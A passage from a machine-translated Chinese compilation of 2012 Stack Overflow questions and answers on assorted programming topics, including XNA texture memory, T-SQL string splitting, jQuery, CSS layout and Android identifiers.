            image_a = Content.Load<Texture2D>("images/" + image+"_a");

            return true;
        }
        catch 
        { 
            System.Diagnostics.Debug.WriteLine("cannot load textures " + image);         
            image_a.Dispose(); 
            image_o.Dispose(); 
        }

        return false; //make sure the caller loads the subsequent image
    } 
```

我猜想 XNA 在每次加载新内容时都会保留过去的纹理，所以我重写了程序来保存一个游戏对象列表，每个游戏对象都有自己的 texture2d 对象。在浏览列表后，我将处理上一个列表项的纹理对象并将下一个列表项的纹理加载到其纹理对象中。该列表只会在整个游戏中遍历一次，我会定期移动到下一个纹理集，并且我只会选择 2 个要加载的纹理，所以理论上，内存中应该只需要 2 个纹理. 我仍然遇到内存错误。就好像我根本无法依靠 dispose 方法及时从内存中释放纹理一样。

我正在加载的纹理都不超过 125KB，我正在为 windows phone 7 构建它

丢弃我不再需要的纹理的最佳方法是什么？参考代码：我应该创建新的 texture2d 对象，交换它们，然后处理原始对象吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-10-18T13:25:28.303

好的，首先是背景知识：**`ContentManager`缓存加载的对象。**[这里](https://stackoverflow.com/a/4265786/165500)（或[这里](https://stackoverflow.com/a/9870420/165500)）有更详细的描述。但基本上每个人都`ContentManager` *拥有*它加载的一切。您不应该调用`Dispose`该内容。清理它的唯一方法是使用`ContentManager.Unload`（或`Dispose`）卸载缓存中的所有内容。

我猜您遇到的问题是您尝试`Load`使用之前调用过的纹理`Dispose`- 然后尝试使用该已处理的纹理。

尽管我想您也可能会用完内存，因为它`ContentManager`正在存储所有那些（空的、已处置`Texture2D`的）对象，从而阻止垃圾收集器回收它们（请参阅[此答案](https://stackoverflow.com/a/3433209/165500)）。

所以，如果你想走这条路，你需要修改`ContentManager`. [此博客文章](http://blogs.msdn.com/b/shawnhar/archive/2007/03/09/contentmanager-readasset.aspx)中解释了如何执行此操作。但基本上，当您想从内容文件创建资产的新实例时，您继承自`ContentManager`、覆盖`Load`和调用。`ReadAsset`

最简单的做法是完全禁用缓存，那篇博文就有一个例子。然后您可以简单地手动管理内容管理器加载的所有内容的生命周期（即：`Dispose`自己调用它）。

如果您想要一些更复杂的东西，也许可以看看我在[这个答案](https://gamedev.stackexchange.com/questions/33088/texture-caching-in-2d-xna-game)中提出的设计，在 GameDev 网站上。

# android - GCM 如何使用注册 ID 与实际设备通信

> ID：12954228
> 
> 赞同：0
> 
> 时间：2012-10-18T12:07:07.067
> 
> 标签：android, google-cloud-messaging

嗨，我正在研究 GCM，我已经轻松实现了这一点，但我被困在 GCM 如何使用该注册 ID 与设备通信的部分，即如何使用注册 ID，或者简单地说，GCM 如何将该消息推送到设备，是否存在开发了一个套接字连接，或者如果有广播，谁正在发射该广播，以及如何？总而言之，我想知道 GCM 如何与我在 VPN 中的设备通信 GCM 如何找到我的设备。我正在做 RND，这是最后一点尚不清楚。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-07T05:59:09.760

我发现 GCM 实际上使用安装在您手机上的 Google Play 应用程序向您的手机发送数据或消息，这就是为什么必须在您的手机上安装 Google Play 应用程序才能使 GCM 正常工作的原因。

如果有人对此有一些更新，请分享

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-19T21:53:02.347

虽然我不确定（它甚至有记录吗？）但我猜 Google 会跟踪与数据库中的注册 ID 相关联的 Google 帐户。当消息排队从他们的服务器发送到设备时，他们会查找该 Google 帐户，并且因为您的手机已连接到 Google 服务器（在 Android 的导航栏中由 wifi 的非白色信号颜色和电池强度指示器指示2.3+）他们可以将其直接发送到所需的设备。

# java - Facebook 集成应用程序在模拟器中完美运行，但在 Android 设备上不适用

> ID：12954230
> 
> 赞同：0
> 
> 时间：2012-10-18T12:07:14.333
> 
> 标签：java, android

我正在制作一个与 Facebook 集成的应用程序。这在模拟器中完美运行，但不适用于 android 设备。

这表明一些错误...

应用程序为 Facebook 登录配置错误。按确定返回应用程序而不连接 Facebook。

但它使用哈希键解决了这个问题

比它不存储访问令牌并在设备中过期之后，它在设备中无法正常工作。

它可以在模拟器中完美运行，但不能在设备上运行。为什么？

我正在使用 Facebook Hackbook 代码来实现这一点。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-18T12:13:21.183

请参阅我之前的答案的以下链接，它将解决您的问题。

[Facebook android本机应用程序无法在实际设备上运行](https://stackoverflow.com/questions/8504823/facebook-android-native-application-not-working-on-actual-device/8877018#8877018)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-18T12:39:15.260

您正在使用 SSO，所以当您在设备上进行测试时，您可能已经安装了 Facebook，而当您在模拟器上进行测试时，您却没有。一种解决方案是使用 FORCE_DIALOG_AUTH - 这样您就可以将您的应用程序与官方应用程序分开。虽然不推荐。

我建议您也将 FB 官方应用程序安装在模拟器上，然后让您的应用程序通过它连接/断开连接。不要保存您的 SharedPreferences，因为您的应用会从 FB 应用中获取它们。

# iphone - 如何在 iOS 中拖动图像的一部分以仅使该部分拉伸？

> ID：12954231
> 
> 赞同：0
> 
> 时间：2012-10-18T12:07:14.727
> 
> 标签：iphone, ios, ios5, core-image

我想拖动图像的特定部分进行拉伸，如下所示。

![在此处输入图像描述](../Images/d1d03c945895f0bd1cf1541a1e1e7eef.png)

我已经检查了[苹果参考](http://developer.apple.com/library/ios/#documentation/GraphicsImaging/Reference/CoreImageFilterReference/Reference/reference.html#//apple_ref/doc/filter/ci/CIBumpDistortionLinear)，因为这在 iOS 6 中可用。但我想在 iOS 5 中实现它`CIBumpDistortionLinear`。。

请提供任何解决方案。

提前致谢

# sql-server - 跨行拆分单行

> ID：12954232
> 
> 赞同：5
> 
> 时间：2012-10-18T12:07:15.773
> 
> 标签：sql-server, tsql, split

给定一个`Promotion`包含行和数据的表，例如：

```
PromotionId    Codes
1              a,b
2              c
3              d,e,f 
```

我怎么能写一个查询来像这样返回它：

```
PromotionId    Codes
1              a
1              b
2              c
3              d
3              e
3              f 
```

基本上我想将代码拆分为多行。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-10-18T12:15:20.447

您可以使用`Split`表值函数，例如：

```
CREATE FUNCTION [dbo].[Split]
(
    @ItemList NVARCHAR(MAX), 
    @delimiter CHAR(1)
)
RETURNS @IDTable TABLE (Item VARCHAR(50))  
AS      

BEGIN    
    DECLARE @tempItemList NVARCHAR(MAX)
    SET @tempItemList = @ItemList

    DECLARE @i INT    
    DECLARE @Item NVARCHAR(4000)

    SET @tempItemList = REPLACE (@tempItemList, ' ', '')
    SET @i = CHARINDEX(@delimiter, @tempItemList)

    WHILE (LEN(@tempItemList) > 0)
    BEGIN
        IF @i = 0
            SET @Item = @tempItemList
        ELSE
            SET @Item = LEFT(@tempItemList, @i - 1)
        INSERT INTO @IDTable(Item) VALUES(@Item)
        IF @i = 0
            SET @tempItemList = ''
        ELSE
            SET @tempItemList = RIGHT(@tempItemList, LEN(@tempItemList) - @i)
        SET @i = CHARINDEX(@delimiter, @tempItemList)
    END 
    RETURN
END 
```

然后你可以使用[`CROSS APPLY`](http://msdn.microsoft.com/en-us/library/ms175156.aspx)它来加入：

```
SELECT PromotionId, CodeList.Item AS Codes
FROM Promotion p
    CROSS APPLY dbo.Split(Codes, ',') CodeList 
```

**编辑**：这是你的数据的一个小提琴：[http ://sqlfiddle.com/#!3/85f8b/1/0](http://sqlfiddle.com/#!3/85f8b/1/0)

结果：

```
PROMOTIONID    CODES
  1             a
  1             b
  2             c
  3             d
  3             e
  3             f 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-18T13:08:13.287

将 SQL 与 XML 一起使用，如下所示：

```
declare @X xml

SET @X= (SELECT CONVERT(xml,'<s id="'+cast(PromotionId as varchar)+'">' + REPLACE(Codes,',','</s><s id="'+cast(PromotionId as varchar)+'">') + '</s>') FROM t1
FOR XML RAW)

SELECT c.value('(@id)[1]','int') as PromotionId, c.value('.','varchar(50)') as Code
FROM @X.nodes('/row/s') T(c) 
```

它将更高效、更快

[SQLFiddle 演示](http://www.sqlfiddle.com/#!3/3db8a/2/0)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-18T12:51:14.583

我相信在 T-SQL 中拆分/联系事物的最快方法是使用 XML。这是我使用的解决方案：

```
;WITH CTE(PromotionID,Codes)
AS
(
    SELECT  PromotionID
           ,CAST(N'<r><![CDATA[' + REPLACE(Codes, ',', ']]></r><r><![CDATA[') + ']]></r>' AS XML) AS Codes
    FROM @SourceTable
)
SELECT  PromotionID
       ,Code
FROM CTE
CROSS APPLY (SELECT DISTINCT RTRIM(LTRIM(Tbl.Col.value('.', 'nvarchar(250)'))) AS Code FROM Codes.nodes('//r') Tbl(Col)) AS List 
```

我已使用公用表表达式将代码转换为 XML。然后我只使用一种常用方法将 XML 拆分为单个元素。这是完整的工作示例：

```
SET NOCOUNT ON
GO

DECLARE @SourceTable TABLE
(
    PromotionID INT,
    Codes NVARCHAR(20)
)

INSERT INTO @SourceTable (PromotionID,Codes)
VALUES   (1,'a,b')
        ,(2,'c')
        ,(3,'d,e,f')

;WITH CTE(PromotionID,Codes)
AS
(
    SELECT  PromotionID
           ,CAST(N'<r><![CDATA[' + REPLACE(Codes, ',', ']]></r><r><![CDATA[') + ']]></r>' AS XML) AS Codes
    FROM @SourceTable
)
SELECT  PromotionID
       ,Code
FROM CTE
CROSS APPLY (SELECT DISTINCT RTRIM(LTRIM(Tbl.Col.value('.', 'nvarchar(250)'))) AS Code FROM Codes.nodes('//r') Tbl(Col)) AS List

SET NOCOUNT OFF
GO 
```

# android - 所有这些 id (uid,pid,userid,appid,sharedUserid) 的关系和作用是什么？

> ID：12954245
> 
> 赞同：4
> 
> 时间：2012-10-18T12:07:59.047
> 
> 标签：android, android-intent

我知道 pid(int) 在创建时由 os 系统分配给进程，这是进程的唯一标识符。uid(int) 是用户（或 android 中的应用程序）的唯一标识符。

*   Q1：什么时候创建一个uid并分配给一个应用程序？
*   Q2：它与AndroidManifest.xml中的'属性或其他属性有关系吗？我知道shareUerId通常是一个系统userId，例如。显然，sharedUserId是一个字符串。
*   Q3：系统uid(int)和shareUserId(string)的映射在哪里？frameworks\base\core\java\android\os 中有一个 UserId.java。可以看到，getUid(int userId, int appId) 方法可以从 userId 和 appId 中获取一个 uid。
*   Q4：这里的userId和appId是什么？

    public static final int getCallingUserId() { return getUserId(Binder.getCallingUid()); 从上面的代码中，我可以得出结论，当 IPC 时，Binder 使用 uid 而不是 UserId。如果是，那么 UserId 的功能是什么。

这里有这么多问题！我认为所有这些对于理解android的IPC都很重要。有人可以回答我的问题吗？最好将所有答案一一列出。提前非常感谢！

公共最终类用户 ID {

```
 /**
     * Range of IDs allocated for a user.
     *
     * @hide
     */
    public static final int PER_USER_RANGE = 100000;

    public static final int USER_ALL = -1;

    /**
     * Enable multi-user related side effects. Set this to false if there are problems with single
     * user usecases.
     * */
    public static final boolean MU_ENABLED = true;

    /**
     * Checks to see if the user id is the same for the two uids, i.e., they belong to the same
     * user.
     * @hide
     */
    public static final boolean isSameUser(int uid1, int uid2) {
        return getUserId(uid1) == getUserId(uid2);
    }

    /**
     * Checks to see if both uids are referring to the same app id, ignoring the user id part of the
     * uids.
     * @param uid1 uid to compare
     * @param uid2 other uid to compare
     * @return whether the appId is the same for both uids
     * @hide
     */
    public static final boolean isSameApp(int uid1, int uid2) {
        return getAppId(uid1) == getAppId(uid2);
    }

    public static final boolean isIsolated(int uid) {
        uid = getAppId(uid);
        return uid >= Process.FIRST_ISOLATED_UID && uid <= Process.LAST_ISOLATED_UID;
    }

    public static boolean isApp(int uid) {
        if (uid > 0) {
            uid = UserId.getAppId(uid);
            return uid >= Process.FIRST_APPLICATION_UID && uid <= Process.LAST_APPLICATION_UID;
        } else {
            return false;
        }
    }

    /**
     * Returns the user id for a given uid.
     * @hide
     */
    public static final int getUserId(int uid) {
        if (MU_ENABLED) {
            return uid / PER_USER_RANGE;
        } else {
            return 0;
        }
    }

    public static final int getCallingUserId() {
        return getUserId(Binder.getCallingUid());
    }

    /**
     * Returns the uid that is composed from the userId and the appId.
     * @hide
     */
    public static final int getUid(int userId, int appId) {
        if (MU_ENABLED) {
            return userId * PER_USER_RANGE + (appId % PER_USER_RANGE);
        } else {
            return appId;
        }
    }

    /**
     * Returns the app id (or base uid) for a given uid, stripping out the user id from it.
     * @hide
     */
    public static final int getAppId(int uid) {
        return uid % PER_USER_RANGE;
    }

    /**
     * Returns the user id of the current process
     * @return user id of the current process
     */
    public static final int myUserId() {
        return getUserId(Process.myUid());
    } 
```

# jquery - 如何切换父背景？

> ID：12954247
> 
> 赞同：0
> 
> 时间：2012-10-18T12:08:05.207
> 
> 标签：jquery

我有带有复选框的简单表格。当它被选中时 - 我需要更改行的颜色。

```
<tr height="35">
    <td><input type="checkbox" ></td>
    <td>Name</td>
    <td>Surname</td>
</tr> 
```

目前我用

```
jQuery('input[type="checkbox"]').click(function(){
    jQuery(this).parent().parent().css('background-color', 'red');
}); 
```

但我认为这`.parent().parent()`不是一个好主意......而且还有一些切换背景的方法？也许在检查或不检查后以某种方式改变蚂蚁？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-18T12:08:44.550

您可以[`closest()`](http://api.jquery.com/closest/)改用：

```
$("input[type='checkbox']").click(function(){
    $(this).closest("tr").css("background-color", "red");
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-18T12:10:47.597

你可以这样做

```
 $("input[type='checkbox']").click(function(){
         $(this).parents("tr:first").css("background-color", "red");
  }); 
```

参考：[http ://api.jquery.com/parents/](http://api.jquery.com/parents/)

演示：http: [//jsfiddle.net/qGZPP/](http://jsfiddle.net/qGZPP/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-18T12:12:59.043

您应该尝试这样做以在复选框单击时切换背景颜色。

```
jQuery('input[type="checkbox"]').click(function(){
    var self = jQuery(this);
    var parentTr = self.closest("tr");
    if(this.checked)
      parentTr.css('background-color', 'red');
    else 
      parentTr.css('background-color', 'default-color or empty if no default color');
}); 
```

检查这个**[演示](http://jsfiddle.net/RLEgY/2/)**

# jsf - jsf突出显示无效输入的标签

> ID：12954249
> 
> 赞同：2
> 
> 时间：2012-10-18T12:08:13.150
> 
> 标签：jsf, omnifaces

是否有一种简单的可能性将特定样式应用于无效的输入标签？

我已经看到[omnifaces highlight](http://showcase.omnifaces.org/components/highlight)组件为输入本身完成工作，但是我项目的给定样式指南强制将其用于输入标签。

这样的事情会很棒：

```
<h:outputLabel for="inputId" value="label" />
<h:inputText id="inputId" value="..." />

<o:highlight errorLabelStyle="errorLabel" /> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-18T13:05:29.430

这是不可能的`<o:highlight>`。然而，为标签应用相同的样式类也相对简单，因此它已经[实现](https://github.com/omnifaces/omnifaces/commit/32378886af100c99f3d82ae96c72a28e592c30e2)。根据[OmniFaces](http://omnifaces.org) 1.2，您可以按如下方式使用它：

```
<h:outputLabel for="inputId" value="label" />
<h:inputText id="inputId" value="..." />

<o:highlight /> 
```

使用以下 CSS：

```
label.error {
    color: red;
}

input.error, select.error, textarea.error {
    background: pink;
} 
```

默认的 stlye 类名`error`可以通过通常的方式覆盖：

```
<o:highlight styleClass="invalid" /> 
```

# ios - 在IOS离线时坚持登录销售队伍

> ID：12954251
> 
> 赞同：1
> 
> 时间：2012-10-18T12:08:23.133
> 
> 标签：ios, salesforce, offline

我想让我的应用程序在离线模式下登录，但我找不到任何文档，请指导我。我正在使用本机休息模板

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-19T00:11:04.220

当应用程序脱机时，您无法登录 Salesforce，因为您无法通过 Salesforce 进行身份验证。听起来您需要实现自己的在本地工作的 PIN 或密码系统。

正如@superfell 所说，如果你想得到好的答案，你需要接受更多的答案。

# ruby-on-rails - 我应该在 rails 3 中使用布尔字段还是 state_machine gem？

> ID：12954252
> 
> 赞同：0
> 
> 时间：2012-10-18T12:08:24.147
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3, boolean

我有一个电子邮件系统，我希望用户可以通过复选框决定在发生确定事件时要接收什么消息，例如

```
field :when_receive_order, :type => Boolean, :default => "true"
field :when_accept_order, :type => Boolean, :default => "true"
field :when_cancel_order, :type => Boolean, :default => "true"
field :when_reject_order, :type => Boolean, :default => "true"
.
.
.
more... 
```

我想知道**在这些情况下****是否是好的`Boolean`使用价值或使用[state_machine gem 。](https://github.com/pluginaweek/state_machine)**

在此链接[http://railstips.org/blog/archives/2012/10/10/booleans-are-baaaaaaaaaad/](http://railstips.org/blog/archives/2012/10/10/booleans-are-baaaaaaaaaad/)中，有人认为`Boolean`价值观不好。所以我提出这个问题。

注意：我的数据库是 mongodb 和我的 odm es mongoid

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-18T12:51:41.487

如果这些布尔值中只有一个始终为真，则可以使用 state_machine。否则，你不能。

在您的情况下，我认为有可能不止一个值是正确的。如果用户想在订单被接受和订单被取消时都收到邮件怎么办？所以你不能使用 state_machine。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-18T12:25:55.123

你是对的，你的实体的这种配置很容易导致错误......你应该依赖这个gem或者查看它的源代码并自己实现它......

# qt - QtCreator：没有完整路径的 Mercurial 版本 $$system(hg..)？

> ID：12954256
> 
> 赞同：0
> 
> 时间：2012-10-18T12:08:40.503
> 
> 标签：qt, mercurial, qt-creator

Win 7 上的 Qt Creator 2.5.2：我正在使用这种方法（[Qt。自动为应用程序添加版本](https://stackoverflow.com/questions/10550071/qt-automatically-adding-version-for-application)）在 Qt Creator 中为我的源代码添加版本号。

但是，由于我的 Mercurial 安装在 中`C:\TortoiseHg\hg`，我必须指定

```
VERSION = $$system(C:\TortoiseHg\hg parents --template '{latesttag}+{latesttagdistance}') 
```

这个完整的路径不是很好，因为其他人可能已经安装在不同的地方。该位置在 Qt Creator 工具 -> 选项 -> 版本控制 -> Mercurial 下正确设置。

是否有机会（变量）反映此设置或其他解决方法？猜猜为了使用`VERSION = $$system(hg parents --template '{latesttag}+{latesttagdistance}')` 我必须全局添加-`C:\TortoiseHg\`由于`PATH`某些原因我想避免。

那么摆脱绝对路径的最佳方法是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-18T12:12:40.343

`.pro`文件不仅是 QtCreator 项目，而且是 qmake 项目文件 - qmake 可能不知道您在 QtCreator 设置中指定的内容。如果您不想将路径添加`hg.exe`到`PATH`，您可能需要创建单独的环境变量并尝试在`$$system`.

# php - .click() javascript 时如何执行一些 php 代码

> ID：12954259
> 
> 赞同：-3
> 
> 时间：2012-10-18T12:08:47.930
> 
> 标签：php, javascript, jquery, ajax

当 js 中的事件 .click() 发生在按钮上时，我想执行一个 php 代码（只有几个 for 循环，没有回声）。ajax 是必须的还是有其他可用的选项？// 我知道整个服务器-客户端的故事。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-18T12:10:19.733

PHP 是在服务器端执行的，所以是的，ajax 是必须的

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-18T12:26:57.397

如果您不想使用 javascript ajax 请求，至少还有一个其他选项。

您可以加载隐藏的 iframe。
iframe 的来源可以是：

```
<iframe src="/myCode.php?par1=1234&par2=abc"></iframe> 
```

这样，你就可以在服务器端执行你的php代码了。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-18T12:13:13.867

阿贾克斯是必须的。PHP 是服务器端，Javascript 是客户端操作。因此，要么从表单创建一个按钮并让它执行一个操作（需要重新加载页面），要么使用 AJAX 来避免前面的语句。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-10-18T12:10:56.130

由于 AJAX 是一个笼统的术语，指的是任何类型的“调用服务器而不重新加载页面”技术，如果你想这样做，这是不可避免的。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-10-18T12:11:50.360

**简短的回答：** 是的，ajax 是必要的

PHP 将始终在您的服务器上运行。您可以使用浏览器和 url 栏或 javascript 发送请求，这取决于您。

# ruby - 内存中的时间和数据库中的时间：错误还是功能？

> ID：12954260
> 
> 赞同：0
> 
> 时间：2012-10-18T12:08:49.247
> 
> 标签：ruby, time, activesupport

我最近发现这种奇怪的行为涉及实例化 Time 对象（例如，使用 Time.now），然后将其值用于算术运算，最终将返回一个整数。我的用例如下：

我实例化一个时间：

```
time = 3.days.from_now 
```

然后我用它来知道从现在到那个时间的秒数：

```
now = Time.now
diff = time - now #=> returns an Integer 
```

现在我将该时间存储在数据库中（假设 a 是一个类似 ActiveRecord 的实例，它将时间存储在 DATETIME 列中）：

```
a.date = time
a.save 
```

现在到了最棘手的部分：

```
a.reload
time2 = a.date
diff2 = time2 - now #=> returns an Integer
diff == diff2 
```

最后一个断言有时是错误的，其他断言是正确的。问题是，当实例化 Time 对象时，其用于 Time 算术运算的值包含高达纳秒和微秒的精度，这将在“-”运算的结果值中考虑。但是当它被存储时，“微精度”被留下了，当存储在数据库中的时间被加载时，它没有纳秒或微秒。因此，它本质上不同于我之前分配给该对象属性的时间实例。这弄乱了我的差异计算。

所以，问题是：如何从 Time 实例化，以便实例的精度仅达到秒，因此如果最终存储该时间实例，则相当于从 db 获取的时间？我更喜欢独立于 ActiveSupport 的解决方案，尽管也欢迎 AS 建议。目标是：diff 必须始终等于 diff2。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-18T12:30:35.553

如果只需要将`Time`a 截断到一秒，可以使用这个，例如：

```
t = Time.at(Time.now.to_i) 
```

代替`Time.now`

编辑：刚刚注意到[`Time#round`](http://www.ruby-doc.org/core-1.9.3/Time.html#method-i-round)方法：

```
t = Time.now.round 
```

也应该这样做。

# windows-8 - Metro Style Apps - MS Office 库

> ID：12954264
> 
> 赞同：2
> 
> 时间：2012-10-18T12:09:03.843
> 
> 标签：windows-8, microsoft-metro

我试图在 Metro 风格应用程序（C#、xaml）中读/写 MS Word 文档，但 Metro 应用程序似乎不支持 Office 库。是否有可能在地铁应用程序中实现这一目标？一些工作？谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-18T17:25:00.713

看看 Word 的 ASPOSE：http: [//asposewords.codeplex.com/](http://asposewords.codeplex.com/)

它是一个类库，使您的应用程序能够执行范围广泛的文档处理任务。Aspose.Words 支持 DOC、DOCX、RTF、HTML、OpenDocument、PDF、XPS、EPUB 等格式。使用 Aspose.Words，您可以在不使用 Microsoft Word 的情况下生成、修改、转换、渲染和打印文档。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-18T12:24:43.430

您也许可以通过使用[SkyDrive API](http://msdn.microsoft.com/en-us/library/live/hh826521)来解决问题，但我不认为这是目前可能的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-18T15:04:23.457

CTP 中有一个[OpenXML SDK](http://www.microsoft.com/en-us/download/details.aspx?id=30425)，但是

```
Open XML SDK 2.5 CTP does not support “.NET APIs for Metro style apps” 
```

发布时没有任何关于支持的声明。

虽然 Word 文档实际上是所有 XML 并且[Windows.Data.Xml.Dom](http://msdn.microsoft.com/en-us/library/windows/apps/br240819.aspx)命名空间是可用的 - 授予比方便的对象模型更多的工作。

# ms-access - 多个 JOIN 查询 - MS Access

> ID：12954272
> 
> 赞同：0
> 
> 时间：2012-10-18T12:09:16.690
> 
> 标签：ms-access, join

所描述的表结构仅供参考。与数据库的列名不同。

我有一个相当不寻常的数据库。我有具有以下结构的代理表（ **Agents ）。**

```
A_ID(PK)|    AgentName    |    Team
------------------------------------
1       |    Abi          |    New
2       |    Carl         |    New
3       |    James        |    New 
```

我有另外两个表，它们有几个字段，但有问题的表有......

表：**交易**

```
ID(PK)  |    manyColumns  |    Agent_ID    |    OUTCOME
--------------------------------------------------------
96      |    ...          |    1           |    9          
98      |    ....         |    2           |    8       
99      |    .....        |    3           |    1 
```

表：**RAWDATA**

```
ID(PK)  |    manyColumns  |    Agent_ID    |    BANK_OUTCOME
-------------------------------------------------------------
1234    |    ...          |    1           |    3
1114    |    ....         |    2           |    333
1745    |    .....        |    3           |    123 
```

我有一个记录表，其中包含员工工作时间的详细信息。

表：**AGENT_ATTENDANCE**

```
ATT_ID  |    Hours Worked |    Agent_ID_FK 
-------------------------------------------
96      |    7.5          |    1            
98      |    7.5          |    2             
99      |    7.5          |    3 
```

我也有员工工资、合同工时的详细信息。

表：**AGENT_DETAILS**

```
DT_ID   |    Hours WK      |    Pay    |    Agent_ID_FK 
-------------------------------------------------------
96      |    37.5          |    15600  |    1            
98      |    37.5          |    15600  |    2             
99      |    37.5          |    15600  |    3 
```

我创建了单独的查询，但我想显示为一个..因为计算相互依赖..我不知道该怎么做..以下是单独的查询..我怎样才能将它们加入一个？

**查询 - 1：**

```
PARAMETERS [EnterStartDate:] DateTime, [EnterEndDate:] DateTime;

SELECT Agents.[Agent Name], 
Sum(IIf((([TRANSACTIONS].[BankOutcome]=3) Or ([TRANSACTIONS].[BankOutcome]=333)),1,0)) AS PositiveOutcome, 
Count(RAWDATA.Outcome) AS TotalRecordsUsed

FROM (RAWDATA LEFT JOIN Agents ON RAWDATA.[AGENT_ID] = Agents.A_ID) LEFT JOIN
TRANSACTIONS ON RAWDATA.ID = TRANSACTIONS.RAW_ID 

WHERE (((RAWDATA.DialedDate) Between [EnterStartDate:] And [EnterEndDate:]))

GROUP BY Agents.[Agent Name], RAWDATA.AGENT_ID

HAVING (((RAWDATA.AGENT_ID) Is Not Null)); 
```

**查询 - 2：**

```
PARAMETERS [EnterStartDate:] DateTime, [EnterEndDate:] DateTime;

SELECT Agents.[Agent Name], AGENT_DETAILS.WK_TARGET_HOURS,
Sum(AGENT_ATTENDENCE.HoursWorked_Day) AS [Actual Hours Worked], 
[WK_TARGET_HOURS]-[Actual Hours Worked] AS [Hours Lost], AGENT_DETAILS.SALARY, 
Round([SALARY]/252/([WK_TARGET_HOURS]/5),2) AS [Hourly Rate], [Hourly Rate]*[Actual Hours Worked] AS [Staff Cost]

FROM (Agents INNER JOIN AGENT_DETAILS ON Agents.A_ID = AGENT_DETAILS.AGENT_ID_fk)
INNER JOIN AGENT_ATTENDENCE ON Agents.A_ID = AGENT_ATTENDENCE.AGENT_ID_fk

WHERE (((AGENT_ATTENDENCE.WorK_Date) Between [EnterStartDate:] And [EnterEndDate:]))

GROUP BY Agents.[Agent Name], AGENT_DETAILS.WK_TARGET_HOURS, AGENT_DETAILS.SALARY, 
Agents.Active, Agents.Team

HAVING (((Agents.Active)=True) AND ((Agents.Team)<>"Manager" And (Agents.Team)<>"Cust. Ser.")); 
```

如果可以的话可以附上文件，但我不知道怎么做。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-18T12:29:07.250

我没有进入你的代码，但大致你有3个选择：

*   如果两个查询具有相同的字段（显然不是您的情况），您可以使用 UNION 查询将两个查询的数据放在 1 个数据集中。
*   否则，您可以使用 query1 作为 query2 的来源
*   最后，您可以构建 query1 和 query2，然后使用第三个查询加入前 2 个

# css - 流体布局中的比率相关元素

> ID：12954275
> 
> 赞同：0
> 
> 时间：2012-10-18T12:09:26.743
> 
> 标签：css

我正在为类似于这个的移动设备设计：http: [//jsfiddle.net/rdCdx/](http://jsfiddle.net/rdCdx/)

我需要满足这些要求：

*   [编辑] 适合左侧的图像以匹配顶部菜单和底部菜单之间的空间高度
*   保留左侧图像的纵横比。
*   让`#products-list`div 占据`#content`'s 宽度的其余部分（现在我已经在那里硬编码了一个值，这不是流动的，这不适用于不同的设备）
*   使`.button`浮动正确并占据`.product`宽度的百分比（例如 10%）

如何实现？

**编辑：**我被卡住的地方是我想不出一种方法来使右侧的元素（即`#products-list`元素）的宽度等于屏幕的宽度减去图像的宽度。

```
what have you tried? 
```

鉴于我所拥有的知识，我想不出任何好的方法来实现我的要求。此外，我还没有在其他任何地方看到过这样的事情。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-18T12:36:15.693

您可以使用 HTML ...这将保留**纵横比**，但会将图像缩放到所需的任何高度，以使宽度为内容容器的 50%。

```
<style type="text/css">
    img { width: 50%; float: left; }
    #product-list { width: 50%; float: right; }
    .product { overflow: hidden; }
    .button { width: 10%; float: right; background: red; }
</style>
<div id="content">
    <img src="http://balloonraces.homestead.com/balloon.jpg"/>
    <div id="product-list">
        <div class="product">
            <a class="button">Button</a>
        </div>
    </div>
</div> 
```

或者，下面保留图片的**大小**，产品列表会占用剩余空间。

```
<style type="text/css">
    img { width: 200px; float: left; }
    #product-list { margin-left: 200px; }
    .product { overflow: hidden; }
    .button { width: 10%; float: right; background: red; }
</style> 
```

您可以通过确定您希望一个开始表现得像另一个的停止点来指定更复杂的行为，假设您希望后一个示例直到两者之间的比例为 1:1 并使用媒体查询缩小。

```
<style type="text/css">
    img { width: 200px; float: left; }
    #product-list { margin-left:  200px; }
    .product { overflow: hidden; }
    .button { width: 10%; float: right; background: red; }

    @media screen and (max-width: 400px) {
        img { width: 50%; }
        #product-list { width: 50%; float: right; margin: 0; }
    }
</style> 
```

任何比这更复杂的东西都可能涉及 JavaScript。

**编辑**因为您更改了问题的条件，您希望图像始终为 100% 的高度，这个答案不再适用。而是使用以下 CSS...

```
<style type="text/css">
    img { height: 100%; float: left; }
    #product-list { overflow: hidden; }
    .product { overflow: hidden; }
    .button { width: 10%; float: right; background: red; }
</style> 
```

# c# - UI 不使用 ExpandoObject 列表更新

> ID：12954279
> 
> 赞同：5
> 
> 时间：2012-10-18T12:09:39.107
> 
> 标签：c#, wpf, user-interface, inotifypropertychanged, expandoobject

[我已经按照这个](https://stackoverflow.com/questions/1983033/how-do-i-dynamically-generate-columns-in-a-wpf-datagrid)链接实现了动态数据网格。

我正在使用 Converter 绑定来自`ExpandoObject`. 这些列显示了学校的总单位等值。

```
Item      ItemCount DefaultSchool School1  School2 School3

